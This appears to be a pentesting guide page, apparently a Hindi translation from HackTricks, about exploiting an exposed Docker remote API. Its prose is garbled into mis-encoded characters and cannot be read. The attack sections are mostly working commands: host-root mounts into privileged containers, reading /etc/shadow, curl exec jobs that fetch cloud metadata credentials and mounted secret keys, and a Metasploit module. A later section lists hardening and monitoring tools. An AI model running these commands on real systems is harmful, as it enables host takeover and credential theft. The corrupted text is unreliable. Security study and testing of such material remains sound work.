рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Podman рдбреЙрдХрд░ рдХреЗ рд╕рдорд╛рди API рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк Podman рдХреЗ рд╕рд╛рде рдбреЙрдХрд░ рдХреЗ рд╕рдорд╛рди рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

рдпрджрд┐ рд╕рдХреНрд╖рдо рд╣реЛ рдЬрд╛рдП, рддреЛ рд░рд┐рдореЛрдЯ API рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ 2375 рдкреЛрд░реНрдЯ рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реЗрд╡рд╛ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрдзреА рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╢реБрд░реВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд░рд┐рдореЛрдЯ API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдорд▓рд╛рд╡рд░реНрдзреА рд╣реЛрд╕реНрдЯ / (рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛) рдХреЛ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╣реЛрд╕реНрдЯ рдХреЗ рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ / рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдПред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
## рдЬрд╛рдВрдЪ

### рдореИрдиреНрдпреБрдЕрд▓

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдбреЙрдХрд░ API рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдЖрдк `docker` рдХрдорд╛рдВрдб рдпрд╛ `curl` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрди рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
рдпрджрд┐ рдЖрдк **`docker` рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рджреВрд░рд╕реНрде рдбреЙрдХрд░ API рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рд╕рдВрдмрдВрдзрд┐рдд рдХрд┐рд╕реА рднреА **рдбреЙрдХрд░** [**рдкрд╣рд▓реЗ рдЯрд┐рдкреНрдкрдгреА рдХрд┐рдП рдЧрдП** рдХрдорд╛рдВрдб](2375-pentesting-docker.md#basic-commands) рдХреЛ **рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% hint style="info" %}
рдЖрдк `export DOCKER_HOST="tcp://localhost:2375"` рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдбреЙрдХрд░ рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде `-H` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

#### рддреНрд╡рд░рд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
#### Curl

рдХрднреА-рдХрднреА рдЖрдк **2376** рдкрд░ **TLS** рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рджреЗрдЦреЗрдВрдЧреЗред рдореИрдВ рдбреЙрдХрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╕рд╛рде рдЗрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд░рд╣рд╛ рд╣реВрдБ, рд▓реЗрдХрд┐рди рдЖрдк curl рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЙрдХрд░ API рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рд╣рд┐рдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
#List containers
curl тАУinsecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl тАУinsecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s тАУinsecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itтАЩs also worth checking out services in case they are adding secrets via environment variables)
curl -s тАУinsecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl тАУinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl тАУinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
рдпрджрд┐ рдЖрдк рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЬрд╣рд╛рдВ рд╕реЗ рдореИрдВрдиреЗ рдХрдорд╛рдВрдб рдХреЙрдкреА рдХреА рд╣реИ, рд╡рд╣рд╛рдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЙрдкрд▓рдмреНрдз рд╣реИ: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
## рдЕрдкрдиреЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдирд╛

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдореЗрдВ рдЖрдкрдХреЛ **рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ** рдХреЗ рддрд░реАрдХреЗ рдорд┐рд▓реЗрдВрдЧреЗ:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЖрдк рджреВрд░рд╕реНрде рдорд╢реАрди рдореЗрдВ рдПрдХ рдХрдордЬреЛрд░ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдорд╢реАрди рдХреЛ рд╕рдВрдХрдЯ рдореЗрдВ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

## рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдирд╛

рдпрджрд┐ рдЖрдк рдПрдХ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ рдЬреЛ рдбреЙрдХрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк [**рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкрдврд╝рдХрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](../linux-hardening/privilege-escalation/#writable-docker-socket).

## рдЪрд▓ рд░рд╣реЗ Docker рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд░рд╣рд╕реНрдпреЛрдВ рдХреА рдЦреЛрдЬ
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **env** (рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдЦрдВрдб) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдкрд╛рдПрдВрдЧреЗ:

* рдкрд╛рд╕рд╡рд░реНрдбред
* рдЖрдИрдкреАред
* рдкреЛрд░реНрдЯред
* рдкрдеред
* рдЕрдиреНрдп... .

рдпрджрд┐ рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдирд┐рдХрд╛рд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
## рдЕрдкрдиреЗ Docker рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛

### Docker рд╕реНрдерд╛рдкрдирд╛ рдФрд░ рдЙрдкрдпреЛрдЧ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛

* рдЖрдк рдЕрдкрдиреА рдореМрдЬреВрджрд╛ Docker рд╕реНрдерд╛рдкрдирд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* `./docker-bench-security.sh`
* рдЖрдк рдЕрдкрдиреА рдореМрдЬреВрджрд╛ Docker рд╕реНрдерд╛рдкрдирд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг [https://github.com/kost/dockscan](https://github.com/kost/dockscan) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* `dockscan -v unix:///var/run/docker.sock`
* рдЖрдк рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдП рдЬрд╛рдиреЗ рдкрд░ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рдкреНрд░рднрд╛рд╡ рдХреЛ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рдХрдВрдЯреЗрдирд░ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдкреНрд░рднрд╛рд╡ рдХреЛ рдЬрд╛рдирдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓рддреА рд╣реИ:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

### Docker рдЗрдореЗрдЬ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛

* рдЖрдк [https://github.com/quay/clair](https://github.com/quay/clair) рдХреЗ рдбреЙрдХрд░ рдЗрдореЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреА рдЕрдиреНрдп рдбреЙрдХрд░ рдЗрдореЗрдЬреЛрдВ рдХреЛ рд╕реНрдХреИрди рдХрд░рдХреЗ рд╕рдВрдХрдЯрдХрд╛рд░реАрддрд╛ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

### Dockerfiles рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛

* рдЖрдк рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдкреНрд░рддреНрдпреЗрдХ рдЧрд▓рддрд┐ рдХреЛ рдПрдХ рдЖрдИрдбреА рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЖрдк рдпрд╣рд╛рдВ [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдХреЛ рдХреИрд╕реЗ рдареАрдХ рдХрд░реЗрдВ рдЗрд╕рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВред
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (418).png>)

* рдЖрдк рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (419).png>)

* рдЖрдк рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (420).png>)

* рдЖрдк рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (421).png>)

### рд╕рдВрджрд┐рдЧреНрдз рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рд▓реЙрдЧ рдХрд░рдирд╛

* рдЖрдк [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЪрд▓ рд░рд╣реЗ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╕рдВрджрд┐рдЧреНрдз рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред
* рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрдВрдХреНрд░ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **Falco рдПрдХ рдХрд░реНрдирд▓ рдореЙрдбреНрдпреВрд▓ рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рдХреЗ рдмрд╛рдж, рдпрд╣ рдирд┐рдпрдореЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ **рд╕рдВрджрд┐рдЧреНрдз рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рд▓реЙрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЗрд╕рдиреЗ 2 рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рдХрдВрдЯреЗрдирд░реЛрдВ рдХреА рд╢реБрд░реБрдЖрдд рдХреА рд╣реИ, рдЬрд┐рдирдореЗрдВ рд╕реЗ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдорд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рдерд╛, рдФрд░ рдХреБрдЫ рд╣реА рд╕реЗрдХрдВрдбреЛрдВ рдмрд╛рдж рдпрд╣ рдЬрд╛рдВрдЪрд╛ рдХрд┐ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╢реИрд▓ рдЦреЛрд▓ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред
```
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
### Docker рдХрд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ

рдЖрдк рдбреЙрдХрд░ рдХреЛ рдореЙрдирд┐рдЯрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП auditd рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
